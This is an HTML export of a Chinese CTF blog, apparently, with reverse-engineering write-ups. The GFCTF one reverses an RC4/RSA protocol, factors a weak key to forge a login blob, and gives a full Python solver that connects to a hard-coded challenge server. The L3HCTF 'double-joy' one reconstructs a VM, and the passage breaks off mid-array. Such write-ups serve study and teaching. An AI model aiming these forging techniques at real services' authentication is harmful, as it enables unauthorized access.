class="comment">//版本</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span>       <span class="comment">//命令</span></span><br><span class="line"><span class="number">0f</span> <span class="number">00</span>       <span class="comment">//后面数据的长度</span></span><br><span class="line">f3 <span class="number">46</span> <span class="number">8</span>a be <span class="number">81</span> <span class="number">62</span> ed <span class="number">36</span> d5 df <span class="number">28</span> dc <span class="number">04</span> <span class="number">8</span>a fd  <span class="comment">//数据，当命令为0的时候，是RC4的key，命令为1和2的时候，是RC4加密的数据</span></span><br></pre></td></tr></table></figure><p>写脚本验证RC4加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4 <span class="keyword">as</span> rc4cipher</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_algorithm</span>(<span class="params">encrypt_or_decrypt, data, key1</span>):</span></span><br><span class="line">    <span class="keyword">if</span> encrypt_or_decrypt == <span class="string">&quot;enc&quot;</span>:</span><br><span class="line">        key = key1</span><br><span class="line">        enc = rc4cipher.new(key)</span><br><span class="line">        res = enc.encrypt(data)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">elif</span> encrypt_or_decrypt == <span class="string">&quot;dec&quot;</span>:</span><br><span class="line">        key = key1</span><br><span class="line">        enc = rc4cipher.new(key)</span><br><span class="line">        res = enc.decrypt(data)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = binascii.unhexlify(<span class="string">&quot;f3468abe8162ed36d5df28dc048afd&quot;</span>)</span><br><span class="line">data1 = binascii.unhexlify(</span><br><span class="line">    <span class="string">&quot;0ea260191fdf390dbc6248575a118778691103764bf92c1f35fdff4ab8d8638fb6b1f0cdd3902d2705b71e012274911aa453df1df4697d3e29bdd330da94a303&quot;</span>)</span><br><span class="line">m1 = rc4_algorithm(<span class="string">&quot;dec&quot;</span>, data1, key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data2 = binascii.unhexlify(</span><br><span class="line">    <span class="string">&quot;84cb11ef7151300bb3d8c122acc4caf12912cf79f5365f5a5ea8f5fa623ce83269d6a154eb1b0606b068205a62ea48ec8a3d5c40d0a803946a2eb7f0e433aaa0e3f2daf8a9cf5d92&quot;</span>)</span><br><span class="line">m2 = rc4_algorithm(<span class="string">&quot;dec&quot;</span>, data2, key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m1)</span><br><span class="line"><span class="built_in">print</span>(m2)</span><br><span class="line"><span class="comment"># b&#x27;\x8ayqv,\x8eYjj\xdb\xfa\x10\xd6\xa0=\xed!w\xa9/\xdd\xa3\x1a \x05!+\xbd\xd0\xa7\xe7\xd4\xba\t%\xb9N\xeeYR\xdc\xb0Pfq\xae\xe9\xc7\x1eB\xa3\x0eA\xb3\x08\xcf1\xb3\x12\xa5L\xd4`\xcc&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;\x00\x10\x00\x80B\x00Please update client!\r\nClient version=10010, Server version=10086\x00&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="./image-20211125160348983.png" alt="image-20211125160348983"></p><p>结合login.key，发现当命令为1的时候，向服务器发送的是login.key的数据，然后服务器返回信息</p><p>所以现在需要构造 真正的login.key(11 55 66 55 98 FA 9B 59 6F F6 14 8F E9 DA 09 61 64 6D 69 6E 36 36 37 37)</p><p> 加密后的数据</p><p><code>sub_10001180</code>是解密函数，进去分析,发现是RSA的PKCS#1加密</p><p><img src="./image-20211125160757257.png" alt="image-20211125160757257"></p><p>根据这个结构找到e和n</p><p><img src="./image-20211125161211503.png" alt="image-20211125161211503"></p><p><img src="./image-20211125161253534.png" alt="image-20211125161253534"></p><p>提取出来</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e: <span class="number">65537</span></span><br><span class="line">n: <span class="number">0xd928b8efe000f72db5bda67a9aa0740defb555b2603736eecd6d01f38ef2fc79</span></span><br><span class="line">分解得到p, q</span><br><span class="line">p = <span class="number">322922590106035145437937724697895880569</span></span><br><span class="line">q = <span class="number">304171468404401467258708275665013611777</span></span><br></pre></td></tr></table></figure><p>利用rsatool.py生成private.pem</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -e 65537 -p 322922590106035145437937724697895880569 -q 304171468404401467258708275665013611777 -o private.pem</span><br></pre></td></tr></table></figure><p>利用在线解密网站测试 <a href="https://the-x.cn/cryptography/Rsa.aspx">https://the-x.cn/cryptography/Rsa.aspx</a></p><p><img src="./image-20211125162250321.png" alt="image-20211125162250321"></p><p>发现解密成功，将构造好的数据进行加密，</p><p><img src="./image-20211125162342644.png" alt="image-20211125162342644"></p><blockquote><p>对于PKCS#1的填充方式可以参考下面2篇文章</p><p><a href="https://www.cloudcared.cn/3155.html">https://www.cloudcared.cn/3155.html</a></p><p><a href="https://www.cnblogs.com/feng9exe/p/8075447.html">https://www.cnblogs.com/feng9exe/p/8075447.html</a></p></blockquote><p>然后写程序与服务器交互，发现服务器返回命令为2的验证码问题</p><p><code>Question(Send result in uint32_t format, 1 second!): 9540808 * 32 + 509 * 859 = ?</code></p><p>然后利用eval计算数值，构造，返回给服务器，即可得到flag，完整的exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4 <span class="keyword">as</span> rc4cipher</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">login_key = [<span class="number">0x5D</span>, <span class="number">0x98</span>, <span class="number">0xEE</span>, <span class="number">0x8B</span>, <span class="number">0x68</span>, <span class="number">0x86</span>, <span class="number">0x2F</span>, <span class="number">0x56</span>, <span class="number">0xBA</span>, <span class="number">0xA1</span>, <span class="number">0x27</span>, <span class="number">0x2A</span>, <span class="number">0x68</span>, <span class="number">0x8B</span>, <span class="number">0x19</span>, <span class="number">0x31</span>, <span class="number">0x37</span>, <span class="number">0xC1</span>, <span class="number">0x2B</span>, <span class="number">0x1A</span>, <span class="number">0x80</span>, <span class="number">0x5F</span>, <span class="number">0xAB</span>, <span class="number">0x8C</span>, <span class="number">0xE0</span>, <span class="number">0xE6</span>, <span class="number">0x81</span>, <span class="number">0xDF</span>, <span class="number">0x05</span>, <span class="number">0xC6</span>, <span class="number">0xB1</span>,</span><br><span class="line">             <span class="number">0x2F</span>, <span class="number">0x0E</span>, <span class="number">0x59</span>, <span class="number">0xC8</span>, <span class="number">0x45</span>, <span class="number">0x8A</span>, <span class="number">0x7D</span>, <span class="number">0x83</span>, <span class="number">0x35</span>, <span class="number">0x5F</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x10</span>, <span class="number">0x8A</span>, <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0x0C</span>, <span class="number">0xE8</span>, <span class="number">0x3C</span>, <span class="number">0x9C</span>, <span class="number">0x15</span>, <span class="number">0xD7</span>, <span class="number">0xDA</span>, <span class="number">0xF0</span>, <span class="number">0x96</span>, <span class="number">0x6D</span>, <span class="number">0x2E</span>, <span class="number">0x77</span>, <span class="number">0xEC</span>, <span class="number">0x78</span>, <span class="number">0x3B</span>, <span class="number">0x83</span>, <span class="number">0xB2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_algorithm</span>(<span class="params">encrypt_or_decrypt, data, key1</span>):</span></span><br><span class="line">    <span class="keyword">if</span> encrypt_or_decrypt == <span class="string">&quot;enc&quot;</span>:</span><br><span class="line">        key = key1</span><br><span class="line">        enc = rc4cipher.new(key)</span><br><span class="line">        res = enc.encrypt(data)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">elif</span> encrypt_or_decrypt == <span class="string">&quot;dec&quot;</span>:</span><br><span class="line">        key = key1</span><br><span class="line">        enc = rc4cipher.new(key)</span><br><span class="line">        res = enc.decrypt(data)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span>(<span class="params">_cmd, _len, _data, _key</span>):</span></span><br><span class="line">    sig = [<span class="number">0x11</span>, <span class="number">0x55</span>, <span class="number">0x66</span>, <span class="number">0x55</span>]      <span class="comment"># 签名</span></span><br><span class="line">    banben = [<span class="number">0x66</span>, <span class="number">0x27</span>]               <span class="comment"># 版本</span></span><br><span class="line">    cmd_list = [_cmd, <span class="number">0x00</span>]             <span class="comment"># 命令</span></span><br><span class="line">    data_len_list = [_<span class="built_in">len</span>, <span class="number">0x00</span>]        <span class="comment"># 数据长度</span></span><br><span class="line">    <span class="keyword">if</span> _<span class="built_in">len</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(sig + banben + cmd_list + data_len_list) + rc4_algorithm(<span class="string">&#x27;enc&#x27;</span>, <span class="built_in">bytes</span>(_data), _key)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(sig + banben + cmd_list + data_len_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_captcha</span>(<span class="params">_captcha_str</span>):</span></span><br><span class="line">    m = re.search(</span><br><span class="line">        <span class="string">r&quot;Question\(Send result in uint32_t format, 1 second!\): (.*?) = &quot;</span>, _captcha_str)</span><br><span class="line">    c = <span class="built_in">eval</span>(m.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;I&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    address = (<span class="string">&#x27;119.27.179.145&#x27;</span>, <span class="number">10086</span>)</span><br><span class="line"></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect(address)</span><br><span class="line"></span><br><span class="line">    s.send(get_data(<span class="number">0</span>, <span class="number">0</span>, [], <span class="literal">None</span>))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    rc4_key = data[<span class="number">10</span>:]                 <span class="comment"># 获取RC4密钥</span></span><br><span class="line"></span><br><span class="line">    s.send(get_data(<span class="number">1</span>, <span class="number">0x40</span>, login_key, rc4_key))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    captcha_str = rc4_algorithm(<span class="string">&quot;dec&quot;</span>, data[<span class="number">10</span>:], rc4_key).decode()</span><br><span class="line">    captcha = get_captcha(captcha_str)        <span class="comment"># 计算得到验证码</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Captcha: <span class="subst">&#123;captcha&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 向服务器返回验证码</span></span><br><span class="line">    send_data = get_data(<span class="number">2</span>, <span class="built_in">len</span>(captcha), <span class="built_in">list</span>(captcha), rc4_key)</span><br><span class="line">    s.send(send_data)</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    m = rc4_algorithm(<span class="string">&quot;dec&quot;</span>, data[<span class="number">10</span>:], rc4_key)</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Captcha: b&#x27;\xc84\x06\x03&#x27;</span></span><br><span class="line">    <span class="comment"># b&#x27;\x00\x10\x00\x805\x00flag_0x00 = \x00GFCTF&#123;e8e9071b7a70770bec1f6415c4ed4c1d&#125;\x00&#x27;</span></span><br></pre></td></tr></table></figure><p>得到flag为 <code>GFCTF&#123;e8e9071b7a70770bec1f6415c4ed4c1d&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFWP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 L3HCTF 部分RE WP</title>
      <link href="/2021/11/17/2021L3HCTF_WP_RE_/"/>
      <url>/2021/11/17/2021L3HCTF_WP_RE_/</url>
      
        <content type="html"><![CDATA[<h1 id="2021-L3HCTF-部分RE-WP"><a href="#2021-L3HCTF-部分RE-WP" class="headerlink" title="2021 L3HCTF 部分RE WP"></a>2021 L3HCTF 部分RE WP</h1><h2 id="double-joy"><a href="#double-joy" class="headerlink" title="double-joy"></a>double-joy</h2><p>IDA打开程序，找到main函数进行分析</p><p><img src="./image-20211116102232560.png"></p><p>最关键的是<code>enc_flag</code> 函数, 经过调试，发现传入的参数有2套，都是固定的结构体</p><p><img src="./image-20211116103019789.png" alt="image-20211116103019789"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">struc_1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">BYTE* pKey;<span class="comment">//指向OPCODE</span></span><br><span class="line">_DWORD* pFlag;   <span class="comment">//指向FLAG，主要这个FLAG前40个字节是用户输入的，后面一大部分要留给程序用</span></span><br><span class="line"><span class="keyword">int</span> i;    <span class="comment">//指向OPCODE的索引</span></span><br><span class="line"><span class="keyword">int</span> stack;    <span class="comment">//指向了一些 “操作数”，在OPCODE 中存着，比如OPCODE是 \XE的话，后面4个字节就是一个“操作数”</span></span><br><span class="line">&#125;struc_1;</span><br></pre></td></tr></table></figure><p>进入 <code>enc_flag</code>函数，F5，发现很乱，然后patch掉一些用于对齐的代码后，F5, 发现是个VM</p><p>调试，发现一共执行了0XCA次 <code>enc_flag</code>, 并且传入的参数是交替的</p><p>还原程序代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;basetsd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> uint32;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _DWORD uint32</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">struc_1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">BYTE* pKey; <span class="comment">//指向OPCODE</span></span><br><span class="line">_DWORD* pFlag;   <span class="comment">//指向FLAG，主要这个FLAG前40个字节是用户输入的，后面一大部分要留给程序用</span></span><br><span class="line"><span class="keyword">int</span> i;<span class="comment">//指向OPCODE的索引</span></span><br><span class="line"><span class="keyword">int</span> stack; <span class="comment">//指向了一些 “操作数”，在OPCODE 中存着，比如OPCODE是 \XE的话，后面4个字节就是一个“操作数”</span></span><br><span class="line">&#125;struc_1;</span><br><span class="line"></span><br><span class="line">BYTE key1[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x15</span>, <span class="number">0xCD</span>, <span class="number">0x5B</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0xB1</span>, <span class="number">0x68</span>, <span class="number">0xDE</span>, <span class="number">0x3A</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x12</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x10</span>, <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0xA8</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x4C</span>,</span><br><span class="line">  <span class="number">0x49</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span 